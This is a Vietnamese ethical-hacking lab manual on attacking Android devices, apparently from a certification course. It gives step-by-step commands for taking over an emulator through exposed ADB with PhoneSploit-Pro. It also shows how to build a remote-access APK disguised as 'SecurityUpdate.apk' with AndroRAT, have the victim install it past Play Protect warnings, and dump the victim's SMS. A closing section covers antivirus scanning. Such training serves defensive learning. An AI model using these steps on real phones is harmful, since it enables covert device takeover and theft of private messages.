Mô-đun 17: Hack nền tảng di động

Kịch bản

Với sự tiến bộ của công nghệ di động, tính di động đã trở thành một tính năng chính của việc sử dụng Internet. Lối sống của mọi người ngày càng phụ thuộc vào điện thoại thông minh và máy tính bảng. Thiết bị di động đang thay thế máy tính để bàn và máy tính xách tay vì chúng cho phép người dùng truy cập email, Internet và điều hướng GPS cũng như lưu trữ dữ liệu quan trọng như danh sách liên hệ, mật khẩu, lịch và thông tin đăng nhập. Ngoài ra, những phát triển gần đây trong thương mại di động đã cho phép người dùng thực hiện các giao dịch trên điện thoại thông minh của họ như mua hàng hóa và ứng dụng qua mạng không dây, đổi phiếu giảm giá và vé cũng như giao dịch ngân hàng.

Hầu hết các thiết bị di động đều có tùy chọn gửi và nhận tin nhắn văn bản hoặc email cũng như tải xuống ứng dụng qua Internet. Mặc dù các chức năng này là tiến bộ công nghệ nhưng tin tặc vẫn tiếp tục sử dụng chúng cho mục đích xấu. Ví dụ: họ có thể gửi APK (tệp gói ứng dụng) hoặc URL không đúng định dạng cho các cá nhân để lôi kéo nạn nhân nhấp vào hoặc thậm chí cài đặt chúng, đồng thời cấp cho kẻ tấn công quyền truy cập vào thông tin đăng nhập của người dùng hoặc quyền kiểm soát toàn bộ hoặc một phần thiết bị của họ.

Bảo mật di động đang trở nên thách thức hơn với sự xuất hiện của các cuộc tấn công phức tạp sử dụng nhiều hướng tấn công để xâm phạm thiết bị di động. Những mối đe dọa bảo mật này có thể dẫn đến việc dữ liệu quan trọng, tiền và thông tin khác bị đánh cắp từ người dùng di động và cũng có thể gây tổn hại đến danh tiếng của các tổ chức và mạng di động. Niềm tin rằng việc lướt Internet trên thiết bị di động là an toàn khiến nhiều người dùng không kích hoạt phần mềm bảo mật trên thiết bị của mình. Sự phổ biến của điện thoại thông minh và tính bảo mật khá lỏng lẻo của chúng đã khiến chúng trở thành mục tiêu hấp dẫn và có giá trị hơn đối với những kẻ tấn công.

Với tư cách là một hacker có đạo đức chuyên nghiệp hoặc người kiểm tra thâm nhập, trước tiên bạn nên kiểm tra nền tảng di động mà tổ chức của bạn sử dụng để tìm các lỗ hổng khác nhau; sau đó, bằng cách sử dụng thông tin này, bạn nên bảo vệ nó khỏi các cuộc tấn công có thể xảy ra.

Trong bài lab này, bạn sẽ có được trải nghiệm thực tế với các kỹ thuật khác nhau để phát động các cuộc tấn công trên nền tảng di động, điều này sẽ giúp bạn kiểm tra tính bảo mật của chúng.

Mục tiêu

Mục tiêu của bài lab là thực hiện hack nền tảng di động và các nhiệm vụ khác bao gồm nhưng không giới hạn ở:

-   Khai thác lỗ hổng trên thiết bị Android

-   Lấy thông tin xác thực của người dùng

-   Hack thiết bị Android bằng ứng dụng độc hại

-   Sử dụng thiết bị Android để khởi động cuộc tấn công DoS vào mục tiêu

-   Khai thác thiết bị Android thông qua ADB

-   Thực hiện Đánh giá bảo mật trên thiết bị Android

Tổng quan về Hack nền tảng di động

Hiện nay, điện thoại thông minh được sử dụng rộng rãi cho cả mục đích kinh doanh và cá nhân. Vì vậy, chúng là kho báu cho những kẻ tấn công muốn đánh cắp dữ liệu cá nhân hoặc công ty. Các mối đe dọa bảo mật đối với thiết bị di động đã tăng lên cùng với sự phát triển của kết nối Internet, việc sử dụng ứng dụng kinh doanh và các ứng dụng khác, các phương thức liên lạc khác nhau hiện có, v.v. Ngoài các mối đe dọa bảo mật nhất định dành riêng cho chúng, thiết bị di động cũng dễ bị ảnh hưởng bởi nhiều mối đe dọa khác có thể áp dụng cho máy tính để bàn và máy tính xách tay, ứng dụng web và mạng.

Ngày nay, điện thoại thông minh cung cấp khả năng kết nối mạng và Internet rộng rãi thông qua nhiều kênh khác nhau như 3G/4G/5G, Bluetooth, Wi-Fi hoặc kết nối máy tính có dây. Các mối đe dọa bảo mật có thể phát sinh trong khi truyền dữ liệu tại các điểm khác nhau dọc theo các đường dẫn khác nhau này.

Nhiệm vụ bài lab

Tin tặc đạo đức hoặc người kiểm tra thâm nhập sử dụng nhiều công cụ và kỹ thuật để tấn công các thiết bị di động mục tiêu. Các bài lab được đề xuất sẽ hỗ trợ bạn học các kỹ thuật tấn công di động khác nhau bao gồm:

1.  Hack thiết bị android

    -   Khai thác nền tảng Android thông qua ADB bằng PhoneSploit-Pro

    -   Hack thiết bị Android bằng cách tạo tệp APK bằng AndroRAT

2.  Bảo mật thiết bị Android bằng nhiều công cụ bảo mật Android khác nhau

    -   Bảo mật thiết bị Android khỏi ứng dụng độc hại bằng AVG

TrướcTiếp theo

Lab 1: Hack thiết bị Android

**Kịch bản bài lab**

Số lượng người sử dụng điện thoại thông minh và máy tính bảng đang gia tăng vì những thiết bị này hỗ trợ nhiều chức năng. Android là hệ điều hành di động phổ biến nhất vì nó là nền tảng mở cho tất cả các ứng dụng. Giống như các hệ điều hành khác, Android có lỗ hổng và không phải tất cả người dùng Android đều cài đặt các bản vá để giữ cho phần mềm và ứng dụng hệ điều hành luôn cập nhật và bảo mật. Tình trạng ngẫu nhiên này cho phép kẻ tấn công khai thác lỗ hổng và thực hiện nhiều kiểu tấn công khác nhau nhằm đánh cắp dữ liệu có giá trị được lưu trữ trên thiết bị của nạn nhân.

Do việc sử dụng rộng rãi và triển khai các chính sách mang thiết bị của riêng bạn (BYOD) trong các tổ chức, thiết bị di động đã trở thành mục tiêu hàng đầu cho các cuộc tấn công. Kẻ tấn công quét các thiết bị này để tìm lỗ hổng. Những cuộc tấn công này có thể liên quan đến thiết bị và lớp mạng, trung tâm dữ liệu hoặc sự kết hợp của những thứ này.

Là một hacker có đạo đức chuyên nghiệp hoặc chuyên gia kiểm thử xâm nhập (pentester), bạn nên làm quen với tất cả các công cụ hack, cách khai thác và tải trọng để thực hiện các thử nghiệm khác nhau trên thiết bị di động được kết nối với mạng nhằm đánh giá cơ sở hạ tầng bảo mật của mạng đó.

Trong bài lab này, chúng tôi sẽ sử dụng nhiều công cụ và kỹ thuật khác nhau để hack thiết bị di động mục tiêu.

**Mục tiêu bài lab**

-   Khai thác nền tảng Android thông qua ADB bằng PhoneSploit-Pro

-   Hack thiết bị Android bằng cách tạo file APK bằng AndroRAT

**Tổng quan về việc hack nền tảng Android**

Android là môi trường phần mềm được Google phát triển dành cho thiết bị di động. Nó bao gồm một hệ điều hành, một phần mềm trung gian và các ứng dụng chính. Hệ điều hành dựa trên Linux của nó được thiết kế đặc biệt cho các thiết bị di động như điện thoại thông minh và máy tính bảng. Android có một tập hợp các thành phần phần mềm được phân loại thành sáu phần (Ứng dụng hệ thống, Khung công tác Java AP, Thư viện C/C++ gốc, Thời gian chạy Android, Lớp trừu tượng phần cứng \[HAL\] và nhân Linux) và năm lớp.

Do số lượng người dùng thiết bị Android ngày càng tăng, chúng đã trở thành mục tiêu chính của tin tặc. Những kẻ tấn công sử dụng nhiều công cụ hack Android khác nhau để khám phá các lỗ hổng trong nền tảng, sau đó khai thác chúng để thực hiện các cuộc tấn công như tấn công DoS, Man-in-the-Disk và Spear phone.

Nhiệm vụ 1: Khai thác Nền tảng Android thông qua ADB bằng PhoneSploit-Pro

Cầu gỡ lỗi Android (ADB) là một công cụ dòng lệnh linh hoạt cho phép bạn giao tiếp với một thiết bị. ADB hỗ trợ nhiều hành động khác nhau của thiết bị như cài đặt và gỡ lỗi ứng dụng, đồng thời cung cấp quyền truy cập vào hệ vỏ Unix mà bạn có thể sử dụng để chạy một số lệnh khác nhau trên thiết bị.

Thông thường, các nhà phát triển kết nối với ADB trên thiết bị Android bằng cáp USB, nhưng cũng có thể thực hiện điều đó không dây bằng cách bật máy chủ daemon tại cổng TCP 5555 trên thiết bị.

Trong nhiệm vụ này, chúng tôi sẽ khai thác nền tảng Android thông qua ADB bằng công cụ PhoneSploit-Pro.

Chúng tôi sẽ nhắm mục tiêu đến máy Android (10.10.1.14) bằng máy Bảo mật Parrot.

Nếu máy Android không phản hồi, hãy nhấp vào biểu tượng Lệnh từ phần trên cùng của màn hình, điều hướng đến Nguồn và Hiển thị \--\> Đặt lại/Khởi động lại máy. Nếu cửa sổ bật lên Đặt lại/Khởi động lại máy xuất hiện, hãy nhấp vào Có để tiếp tục.

1.  Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/59a9e959-9b6d-4783-825c-41a91d326624)

2.  Trong máy Bảo mật Parrot, hãy mở một cửa sổ terminal / dòng lệnh và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập cả mật khẩu).

3.  Bây giờ, hãy chạy lệnh cd PhoneSploit-Pro để điều hướng đến thư mục PhoneSploit-Pro.

> Theo mặc định, công cụ sẽ được sao chép vào thư mục gốc.
>
> ![Screenshot](media/image2.jpeg){width="10.6625in" height="8.0in"}

4.  Bây giờ, hãy thực thi lệnh python3 phoneploitpro.py để chạy công cụ.

> ![Screenshot](media/image3.jpeg){width="10.6625in" height="8.0in"}

5.  Khi được nhắc Bạn vẫn muốn tiếp tục PhoneSploit Pro chứ?, hãy nhập Y và nhấn Enter.

> ![Screenshot](media/image4.jpeg){width="10.6625in" height="8.0in"}

6.  Các tùy chọn menu chính của PhoneSploit Pro xuất hiện như trong ảnh chụp màn hình.

> ![Screenshot](media/image5.jpeg){width="10.6625in" height="8.0in"}

7.  Nhập 1 và nhấn Enter để chọn 1. Tùy chọn Kết nối thiết bị.

8.  Khi được nhắc Nhập địa chỉ IP của điện thoại, hãy nhập địa chỉ IP của thiết bị Android mục tiêu (trong trường hợp này là 10.10.1.14) và nhấn Enter.

> Nếu bạn gặp phải lỗi Đã hết thời gian kết nối, hãy nhập lại 1 và nhấn Enter. Nếu bạn không nhận được bất kỳ tùy chọn nào, hãy nhập 1 và nhấn Enter lại cho đến khi bạn nhận được tùy chọn Nhập địa chỉ IP của điện thoại.

9.  Bạn sẽ thấy thiết bị Android mục tiêu (trong trường hợp này là 10.10.1.14) được kết nối qua số cổng 5555.

> Nếu bạn không thể thiết lập kết nối với thiết bị mục tiêu, hãy nhấn Ctrl+C và thực hiện lại các bước#7-9.
>
> ![Screenshot](media/image6.jpeg){width="10.6625in" height="8.0in"}

10. Tại lời nhắc Menu chính, hãy nhập 6 và nhấn Enter để chọn Nhận ảnh chụp màn hình.

11. Khi được nhắc Nhập vị trí để lưu tất cả ảnh chụp màn hình, hãy nhấn Enter theo mặc định, nhập /home/kẻ tấn công/Máy tính để bàn làm vị trí và nhấn Enter. Ảnh chụp màn hình của thiết bị di động mục tiêu sẽ được lưu ở vị trí nhất định.

> ![Screenshot](media/image7.jpeg){width="10.6625in" height="8.0in"}

12. Khi được nhắc Bạn có muốn mở tệp không?, hãy nhập Y và nhấn Enter. Thao tác này sẽ mở ảnh chụp màn hình như hiển thị bên dưới.

> ![Screenshot](media/image8.jpeg){width="10.6625in" height="8.0in"}

13. Đóng cửa sổ Ảnh chụp màn hình và chuyển trở lại cửa sổ terminal / dòng lệnh.

14. Tại lời nhắc Menu chính, hãy nhập 13 và nhấn Enter để chọn Liệt kê các ứng dụng đã cài đặt.

15. Nhập 2 và nhấn Enter để Liệt kê tất cả các gói.

> ![Screenshot](media/image9.jpeg){width="10.6625in" height="8.0in"}

16. Kết quả xuất hiện, hiển thị các ứng dụng đã cài đặt trên thiết bị Android mục tiêu, như trong ảnh chụp màn hình.

> Sử dụng thông tin này, bạn có thể sử dụng các tùy chọn PhoneSploit-Pro khác để khởi chạy hoặc gỡ cài đặt bất kỳ ứng dụng nào đã cài đặt.
>
> ![Screenshot](media/image10.jpeg){width="10.6625in" height="8.0in"}

17. Bây giờ, tại lời nhắc Menu chính, hãy nhập 10 và nhấn Enter để chọn Chạy ứng dụng. Trong ví dụ này, chúng tôi sẽ khởi chạy ứng dụng máy tính trên thiết bị Android mục tiêu.

> Dựa trên thông tin thu được ở bước trước về các ứng dụng đã cài đặt, bạn có thể khởi chạy bất kỳ ứng dụng nào bạn chọn.

18. Nhập 2 và nhấn Enter để Nhập tên gói theo cách thủ công.

19. Để khởi chạy ứng dụng máy tính, hãy nhập com.android.computer2 và nhấn Enter.

> ![Screenshot](media/image11.jpeg){width="10.6625in" height="8.0in"}

20. Sau khi khởi chạy ứng dụng máy tính trên thiết bị Android mục tiêu, hãy nhấp vào Android để chuyển sang máy Android.[Android](https://labclient.labondemand.com/Instructions/59a9e959-9b6d-4783-825c-41a91d326624)

21. Bạn sẽ thấy ứng dụng máy tính đang chạy, như trong ảnh chụp màn hình.

> ![Screenshot](media/image12.jpeg){width="12.0in" height="9.0in"}

22. Nhấp vào Bảo mật Vẹt để chuyển về máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/59a9e959-9b6d-4783-825c-41a91d326624)

23. Bây giờ, tại lời nhắc Menu chính, hãy nhập 14 và nhấn Enter để chọn Truy cập Device Shell.

24. Bạn có thể quan sát thấy dòng lệnh shell xuất hiện, như trong ảnh chụp màn hình.

> ![Screenshot](media/image13.jpeg){width="10.6625in" height="8.0in"}

25. Trong dòng lệnh shell, nhập pwd và nhấn Enter để xem thư mục làm việc hiện tại trên thiết bị Android mục tiêu.

26. Trong kết quả, bạn có thể quan sát thấy pwd là thư mục gốc.

> ![Screenshot](media/image14.jpeg){width="10.6625in" height="8.0in"}

27. Bây giờ, hãy nhập ls và nhấn Enter để xem tất cả các tệp có trong thư mục gốc.

> ![Screenshot](media/image15.jpeg){width="10.6625in" height="8.0in"}

28. Nhập cd sdcard và nhấn Enter để điều hướng đến thư mục sdcard.

> ![Screenshot](media/image16.jpeg){width="10.6625in" height="8.0in"}

29. Nhập ls và nhấn Enter để liệt kê tất cả các tệp và thư mục có sẵn.

> Trong ví dụ này, chúng tôi sẽ tải xuống tệp hình ảnh (images.jpeg) mà chúng tôi đã đặt trong thư mục Tải xuống của máy Android trước đó; bạn có thể làm tương tự trước khi thực hiện các bước tiếp theo.
>
> ![Screenshot](media/image17.jpeg){width="10.6625in" height="8.0in"}

30. Nhập cd Tải xuống và nhấn Enter để điều hướng đến thư mục Tải xuống.

31. Nhập ls và nhấn Enter để liệt kê tất cả các tệp có sẵn trong thư mục. Trong trường hợp này, chúng tôi quan tâm đến tệp images.jpeg mà chúng tôi đã tải xuống trước đó.

> Ghi lại vị trí của images.jpeg (trong ví dụ này là /sdcard/Download/images.jpeg). Bạn có thể tải tệp xuống bằng cách chọn tùy chọn 8 trong các tùy chọn menu chính của PhoneSploit Pro.
>
> ![Screenshot](media/image18.jpeg){width="10.6625in" height="8.0in"}

32. Nhập exit và nhấn Enter để thoát dòng lệnh shell và quay lại menu chính.

33. Trong cửa sổ terminal / dòng lệnh, hãy nhập N và nhấn Enter để điều hướng đến các tùy chọn PhoneSploit-Pro bổ sung trên Trang tiếp theo.

34. Kết quả xuất hiện, hiển thị các tùy chọn PhoneSploit Pro bổ sung, như minh họa trong ảnh chụp màn hình.

> ![Screenshot](media/image19.jpeg){width="10.6625in" height="8.0in"}

35. Tại lời nhắc Menu chính, hãy nhập 23 và nhấn Enter để chọn Mở liên kết trên thiết bị.

36. Khi được nhắc Nhập URL, hãy nhập URL mong muốn (trong trường hợp này là https://pranx.com/hacker/) và nhấn Enter.

> ![Screenshot](media/image20.jpeg){width="10.6625in" height="8.0in"}

37. Nhấp vào Android để chuyển sang máy Android. Tại đây, bạn có thể thấy rằng liên kết đã được mở tự động.[Android](https://labclient.labondemand.com/Instructions/59a9e959-9b6d-4783-825c-41a91d326624)

> Nếu Mở bằng cửa sổ bật lên xuất hiện Nhấp vào Chrome \| Chỉ một lần thôi. Nếu cửa sổ bật lên Chúng tôi coi trọng quyền riêng tư của bạn xuất hiện, hãy nhấp vào ĐỒNG Ý.
>
> ![Screenshot](media/image21.jpeg){width="12.0in" height="9.0in"}

38. Nhấp vào Bảo mật Vẹt để chuyển về máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/59a9e959-9b6d-4783-825c-41a91d326624)

39. Bây giờ, tại lời nhắc Menu chính, hãy nhập 27 và nhấn Enter để chọn tùy chọn Nhận thông tin thiết bị.

40. Kết quả hiện ra, hiển thị thông tin thiết bị của thiết bị Android mục tiêu như trong ảnh chụp màn hình.

> Với mục đích trình diễn, trong nhiệm vụ này, chúng tôi đang khai thác máy giả lập Android. Tuy nhiên, trong thực tế, những kẻ tấn công sử dụng công cụ tìm kiếm Shodan để tìm các thiết bị hỗ trợ ADB và khai thác chúng để lấy thông tin nhạy cảm và thực hiện các hoạt động độc hại.
>
> ![Screenshot](media/image22.jpeg){width="10.6625in" height="8.0in"}

41. Theo cách tương tự, bạn có thể khai thác thêm thiết bị Android mục tiêu bằng cách chọn các tùy chọn PhoneSploit-Pro khác như Cài đặt APK, Ghi màn hình điện thoại, Khóa thiết bị và Gỡ cài đặt ứng dụng.

42. Phần này kết thúc phần trình diễn cách khai thác nền tảng Android thông qua ADB bằng PhoneSploit-Pro.

43. Ghi lại tất cả thông tin thu được và đóng tất cả các cửa sổ đang mở.

**Câu 17.1.1.1**

Sử dụng công cụ PhoneSploit Pro để khai thác nền tảng di động Android thông qua ADB. Sử dụng PhoneSploit-Pro để liệt kê danh sách các ứng dụng đã cài đặt. Xác định và cung cấp tên gói của ứng dụng Máy ảnh có trên thiết bị Android.

![](media/image23.wmf)

Nhiệm vụ 2: Hack thiết bị Android bằng cách tạo tệp APK bằng AndroRAT

AndroRAT là một công cụ được thiết kế để trao quyền kiểm soát hệ thống Android cho người dùng từ xa và truy xuất thông tin từ nó. AndroRAT là một ứng dụng máy khách/máy chủ được phát triển bằng Java Android dành cho phía máy khách và Máy chủ bằng Python. AndroRAT cung cấp một cửa hậu hoàn toàn liên tục cho thiết bị mục tiêu khi ứng dụng tự động khởi động khi thiết bị khởi động, nó cũng lấy được vị trí hiện tại, chi tiết thẻ sim, địa chỉ IP và địa chỉ MAC của thiết bị.

Trong nhiệm vụ này, chúng tôi sẽ sử dụng AndroRAT để tạo tệp APK để hack thiết bị Android.

Khởi động lại máy Android trước khi bắt đầu tác vụ. Để làm như vậy, hãy nhấp vào biểu tượng Lệnh từ góc trên cùng bên trái của màn hình và điều hướng đến Nguồn -\> Đặt lại/Khởi động lại máy. Nếu cửa sổ bật lên Đặt lại/Khởi động lại máy xuất hiện, hãy nhấp vào Có để tiếp tục.

1.  Trong máy Bảo mật Parrot, hãy mở một cửa sổ terminal / dòng lệnh và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập cả mật khẩu).

2.  Chạy lệnh cd AndroRAT để điều hướng đến kho lưu trữ AndroRAT.

3.  Chạy lệnh python3 androRAT.py \--build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk để tạo tệp APK (tại đây, SecurityUpdate.apk).

    -   **\--build: được sử dụng để xây dựng APK**

    -   **-i: chỉ định địa chỉ IP cục bộ (ở đây, 10.10.1.13)**

    -   **-p: chỉ định số cổng (ở đây, 4444)**

    -   **-o: chỉ định tệp APK đầu ra (tại đây, SecurityUpdate.apk)**

4.  Bạn có thể quan sát thấy tệp APK (SecurityUpdate.apk) được tạo tại vị trí /home/Attacker/AndroRAT/.

> ![Screenshot](media/image24.jpeg){width="10.6625in" height="8.0in"}

5.  Chạy lệnh cp /home/Attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/ để sao chép tệp SecurityUpdate.apk vào thư mục chia sẻ vị trí.

> Nếu thư mục chia sẻ không tồn tại, hãy thực hiện các lệnh sau để tạo thư mục chia sẻ và gán các quyền cần thiết cho nó:

-   Chạy lệnh mkdir /var/www/html/share để tạo thư mục dùng chung

-   Chạy chmod -R 755 /var/www/html/share lệnh

-   Chạy chown -R www-data:www-data /var/www/html/share command

6.  Thực thi lệnh khởi động dịch vụ apache2 để khởi động máy chủ web Apache.

> ![Screenshot](media/image25.jpeg){width="10.6625in" height="8.0in"}

7.  Bây giờ, hãy chạy python3 androRAT.py \--shell -i 0.0.0.0 -p 4444 lệnh để bắt đầu nghe máy của nạn nhân.

    -   **\--shell: được sử dụng để lấy trình thông dịch**

    -   **-i: chỉ định địa chỉ IP để nghe (ở đây, 0.0.0.0)**

    -   **-p: chỉ định số cổng (ở đây, 4444)**

8.  Bạn có thể quan sát thấy AndroRAT bắt đầu chờ kết nối.

> ![Screenshot](media/image26.jpeg){width="10.6625in" height="8.0in"}

9.  Nhấp vào Android để chuyển sang máy giả lập Android.[Android](https://labclient.labondemand.com/Instructions/59a9e959-9b6d-4783-825c-41a91d326624)

10. Nếu máy Android không phản hồi, hãy nhấp vào biểu tượng Lệnh từ phần trên cùng của màn hình và điều hướng đến Nguồn và Hiển thị \--\> Đặt lại/Khởi động lại máy.

> Nếu cửa sổ bật lên Đặt lại/Khởi động lại máy xuất hiện, hãy nhấp vào Có để tiếp tục.

11. Trong GUI của Trình mô phỏng Android, hãy nhấp vào biểu tượng Chrome ở phần dưới của Màn hình chính để khởi chạy trình duyệt

12. Trong thanh địa chỉ, nhập http://10.10.1.13/share và nhấn Enter.

> Nếu a Duyệt nhanh hơn. Sử dụng ít dữ liệu hơn. thông báo xuất hiện, hãy nhấp vào Không, cảm ơn.
>
> Nếu cửa sổ bật lên xuất hiện, hãy nhấp vào Cho phép.

13. Trang Chỉ mục /chia sẻ xuất hiện; nhấp vào SecurityUpdate.apk để tải xuống tệp gói ứng dụng.

14. Nếu Chrome cần quyền truy cập vào bộ nhớ để tải tệp xuống thì một cửa sổ bật lên sẽ xuất hiện; nhấp vào Tiếp tục. Nếu bất kỳ cửa sổ bật lên nào xuất hiện cho biết tệp có chứa vi-rút, hãy bỏ qua thông báo đó và vẫn tải xuống tệp.

> **Trong Cho phép Chrome truy cập ảnh, phương tiện và tệp trên thiết bị của bạn?, hãy nhấp vào CHO PHÉP.**

15. Nếu Không thể tải xuống tệp một cách an toàn cửa sổ bật lên xuất hiện, hãy nhấp vào Giữ.

16. Sau khi tải tệp xuống, Cửa sổ bật lên Đã tải tệp xuống sẽ xuất hiện, hãy nhấp vào Mở.

> ![Screenshot](media/image27.jpeg){width="12.0in" height="9.0in"}

17. Cửa sổ Google Service Framework xuất hiện, nhấp vào nút CÀI ĐẶT để cài đặt ứng dụng độc hại.

> Nếu cửa sổ bật lên xuất hiện, hãy nhấp vào Chi tiết khác \| Cài đặt bằng mọi cách.
>
> ![Screenshot](media/image28.jpeg){width="12.0in" height="9.0in"}

18. Sau khi ứng dụng được cài đặt thành công, một thông báo Đã cài đặt ứng dụng sẽ xuất hiện; nhấp vào MỞ.

> Cửa sổ bật lên bị chặn bởi play Protect xuất hiện nhấp vào CÀI ĐẶT BẤT CỨ NÀO
>
> Gửi ứng dụng để quét? cửa sổ bật lên xuất hiện, nhấp vào KHÔNG GỬI
>
> ![Screenshot](media/image29.jpeg){width="12.0in" height="9.0in"}

19. Ứng dụng độc hại bắt đầu chạy ở chế độ nền mà nạn nhân hoàn toàn không biết về nó.

20. Nhấp vào Bảo mật Vẹt chuyển về máy Bảo mật Vẹt. Phiên Thông dịch viên đã được mở thành công với kết nối từ máy nạn nhân (10.10.1.14), như minh họa trong ảnh chụp màn hình.[Parrot Security](https://labclient.labondemand.com/Instructions/59a9e959-9b6d-4783-825c-41a91d326624)

> Trong trường hợp này, 10.10.1.14 là địa chỉ IP của máy nạn nhân (Trình mô phỏng Android).
>
> ![Screenshot](media/image30.jpeg){width="10.6625in" height="8.0in"}

21. Trong phiên Thông dịch viên, hãy nhập trợ giúp và nhấn Enter để xem các lệnh có sẵn trong phiên đã mở.

> ![Screenshot](media/image31.jpeg){width="10.6625in" height="8.0in"}

22. Bây giờ, hãy nhập deviceInfo và nhấn Enter để xem thông tin liên quan đến thiết bị.

> ![Screenshot](media/image32.jpeg){width="10.6625in" height="8.0in"}

23. Nhập hộp thư đến getSMS và nhấn Enter để lấy tệp chứa SMS từ hộp thư đến của thiết bị nạn nhân.

24. Tệp này được lưu trữ tại vị trí /home/kẻ tấn công/AndroRAT/Dumps.

> ![Screenshot](media/image33.jpeg){width="10.6625in" height="8.0in"}

25. Nhập getMACAddress và nhấn Enter để xem địa chỉ MAC trên thiết bị của nạn nhân.

> ![Screenshot](media/image34.jpeg){width="10.6625in" height="8.0in"}

26. Theo cách tương tự, bạn có thể thử thực thi các lệnh bổ sung có sẵn trong danh sách các lệnh trợ giúp để thu thập thêm thông tin về thiết bị đích.

27. Nhập thoát và nhấn Enter để kết thúc phiên Phiên dịch.

28. Phần này kết thúc phần trình diễn cách hack thiết bị Android thông qua tệp APK được tạo bằng AndroRAT.

29. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

30. Bạn cũng có thể sử dụng các công cụ hack Android khác như hxp_photo_eye (https://github.com), Gallery Eye (https://github.com), mSpy (https://www.mspy.com) và Hackingtoolkit (https://github.com) để hack các thiết bị Android.

**Câu 17.1.2.1**

Sử dụng AndroRAT để tạo tệp APK để hack thiết bị Android. Nhập tùy chọn được sử dụng để chỉ định địa chỉ IP cục bộ trong khi tạo tệp APK bằng androRAT.

![](media/image23.wmf)

Câu 17.1.2.2

Sử dụng AndroRAT để tạo tệp APK để hack thiết bị Android. Lệnh được sử dụng để lấy tệp chứa SMS từ hộp thư đến của thiết bị nạn nhân bằng androRAT là gì.

![](media/image23.wmf)

TrướcTiếp theo

Lab 2: Bảo mật thiết bị Android bằng nhiều công cụ bảo mật Android khác nhau

**Kịch bản bài lab**

Giống như máy tính cá nhân, thiết bị di động lưu trữ dữ liệu nhạy cảm và dễ bị đe dọa bởi nhiều mối đe dọa khác nhau. Do đó, chúng phải được bảo mật đúng cách để ngăn chặn sự xâm phạm hoặc mất dữ liệu bí mật, giảm nguy cơ xảy ra các mối đe dọa khác nhau như vi-rút và Trojan cũng như giảm thiểu các hình thức lạm dụng khác. Các biện pháp nghiêm ngặt và công cụ bảo mật là rất quan trọng để tăng cường bảo mật cho các thiết bị này.

Sự phổ biến ngày càng tăng của Android đã dẫn đến các mối đe dọa bảo mật ngày càng tăng, từ phần mềm độc hại thông thường đến các kỹ thuật lừa đảo và đánh cắp danh tính nâng cao. Với tư cách là một hacker có đạo đức chuyên nghiệp hoặc người kiểm tra thâm nhập, bạn nên quét mọi cài đặt không bảo mật trên thiết bị di động mà bạn đang đánh giá, sau đó thực hiện hành động thích hợp để bảo mật chúng. Bạn phải làm điều này trước khi tin tặc khai thác những lỗ hổng này bằng cách; ví dụ: tải xuống dữ liệu nhạy cảm, phạm tội bằng cách sử dụng thiết bị Android của bạn làm bệ phóng và cuối cùng gây nguy hiểm cho doanh nghiệp của bạn.

Có nhiều công cụ bảo mật khác nhau có sẵn để quét, phát hiện và đánh giá các lỗ hổng cũng như trạng thái bảo mật của thiết bị Android. Nhiều công ty phần mềm bảo mật đã tung ra các ứng dụng của riêng họ, bao gồm một số bộ bảo mật hoàn chỉnh có khả năng chống trộm.

Các nhiệm vụ trong bài lab này sẽ hỗ trợ bạn thực hiện đánh giá bảo mật của thiết bị Android mục tiêu.

**Mục tiêu bài lab**

-   Bảo mật thiết bị Android khỏi ứng dụng độc hại bằng AVG

**Tổng quan về Công cụ bảo mật Android**

Các công cụ bảo mật Android tiết lộ trạng thái bảo mật của các nền tảng và thiết bị Android cụ thể. Bạn có thể sử dụng chúng để tìm nhiều cách khác nhau nhằm tăng cường tính bảo mật và độ mạnh mẽ cho nền tảng di động của tổ chức bạn. Những công cụ này tự động hóa quá trình đánh giá bảo mật nền tảng Android một cách chính xác.

Nhiệm vụ 1: Bảo mật thiết bị Android khỏi ứng dụng độc hại bằng AVG

AVG AntiVirus là công cụ bảo mật di động cung cấp khả năng bảo vệ chống lại vi-rút và phần mềm độc hại có hại. Nó cũng cung cấp khả năng bảo vệ dữ liệu cá nhân của bạn với Khóa ứng dụng, Photo Vault, Quét bảo mật Wi-Fi, Cảnh báo hack, bảo mật phần mềm độc hại và cố vấn về Quyền ứng dụng.

Trong nhiệm vụ này, chúng tôi sẽ bảo mật thiết bị Android khỏi các ứng dụng độc hại bằng AVG AntiVirus & Security.

1.  Nhấp vào Android để chuyển sang máy Android, nhấp vào biểu tượng Lệnh từ phần trên cùng của màn hình, nhấp vào nút Nguồn và Hiển thị rồi chọn Đặt lại/Khởi động lại máy.[Android](https://labclient.labondemand.com/Instructions/59a9e959-9b6d-4783-825c-41a91d326624)

> Nếu cửa sổ bật lên Đặt lại/Khởi động lại máy xuất hiện, hãy nhấp vào Có để tiếp tục.

2.  Sau khi máy khởi động lại, hãy vuốt lên màn hình chính, màn hình này sẽ hiển thị tất cả các ứng dụng. Nhấp vào ứng dụng AVG AntiVirus.

> ![Screenshot](media/image35.jpeg){width="12.0in" height="9.0in"}

3.  AVG AntiVirus khởi chạy. Thông báo Chào mừng đến với AVG xuất hiện; hãy nhấp vào nút BẮT ĐẦU để tiếp tục.

> ![Screenshot](media/image36.jpeg){width="12.0in" height="9.0in"}

4.  Nhấp vào BỎ QUA hiện ở góc trên bên phải của cửa sổ.

> ![Screenshot](media/image37.jpeg){width="12.0in" height="9.0in"}

5.  Một cửa sổ xuất hiện yêu cầu Nâng cấp lên gói Ultimate; nhấp vào Nhấp vào Tiếp tục với quảng cáo \| Bằng lòng.

6.  Màn hình AVG AntiVirus tải; nhấp vào nút BẮT ĐẦU QUÉT.

> Nếu Bạn được bảo vệ bằng cửa sổ bật lên AVG xuất hiện, hãy nhấp vào Tiếp tục với quảng cáo.
>
> Nếu cửa sổ bật lên yêu cầu quyền xuất hiện, hãy nhấp vào OK.
>
> Nếu cửa sổ bật lên của hệ thống xuất hiện yêu cầu quyền Cho phép AVG AntiVirus truy cập ảnh, phương tiện và tệp, hãy nhấp vào Cho phép.
>
> ![Screenshot](media/image38.jpeg){width="12.0in" height="9.0in"}

7.  AVG AntiVirus bắt đầu quét bảo mật, như minh họa trong ảnh chụp màn hình.

